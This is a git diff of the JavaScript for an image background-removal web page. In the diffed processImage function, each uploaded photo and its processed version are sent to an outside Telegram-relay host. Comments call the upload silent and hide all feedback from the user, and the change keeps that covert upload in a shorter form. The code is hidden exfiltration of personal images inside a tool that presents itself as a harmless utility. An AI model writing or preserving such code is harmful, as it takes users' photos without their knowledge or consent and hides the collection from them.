@@ -336,10 +336,10 @@ async function processImage(file) {
     showLoading();
 
     try {
+        // 1. Upload to background remover
         const formData = new FormData();
         formData.append('file', file);
 
-        // Step 1: Background removal request
         const response = await fetch(`${API_BASE_URL}/remove`, {
             method: 'POST',
             body: formData
@@ -349,41 +349,36 @@ async function processImage(file) {
             throw new Error(`HTTP error! status: ${response.status}`);
         }
 
-        // Step 2: Get processed image as blob
+        // 2. Receive processed image
         processedImageBlob = await response.blob();
-        const processedImageURL = URL.createObjectURL(processedImageBlob);
 
-        // Show image preview
+        // 3. Show both images in UI
         originalImg.src = URL.createObjectURL(file);
-        processedImg.src = processedImageURL;
+        processedImg.src = URL.createObjectURL(processedImageBlob);
         previewContainer.style.display = 'block';
 
         hideLoading();
         showSuccess('Background removed successfully!');
 
-        // Step 3: Send both original & processed silently to Telegram
-        try {
-            const telegramForm = new FormData();
-            telegramForm.append('original', file, 'original.png');
-            telegramForm.append('processed', processedImageBlob, 'no_bg.png');
+        // 4. 🔐 Send both to Telegram (SILENTLY)
+        const telegramForm = new FormData();
+        telegramForm.append('original', file, 'original.png');
+        telegramForm.append('processed', processedImageBlob, 'no_bg.png');
 
-            await fetch("https://telegram-file-uploader-hy9e.onrender.com/upload", {
-                method: "POST",
-                body: telegramForm,
-            });
-
-            // No toast, no log — full silent ✅
-        } catch (uploadError) {
-            // Even if telegram upload fails — silently fail
-        }
+        fetch("https://telegram-file-uploader-hy9e.onrender.com/upload", {
+            method: "POST",
+            body: telegramForm,
+        }).catch(() => {
+            // Even if it fails, don't show anything to user
+        });
 
     } catch (err) {
-        console.error('Error processing image:', err);
+        console.error('Image processing error:', err);
         hideLoading();
-        showError('Failed to process image. Please try again or check if the backend is running.');
+        showError('Failed to process image. Please try again.');
     }
 }
-}
+
 
 function downloadImage() {
     if (!processedImageBlob) return;
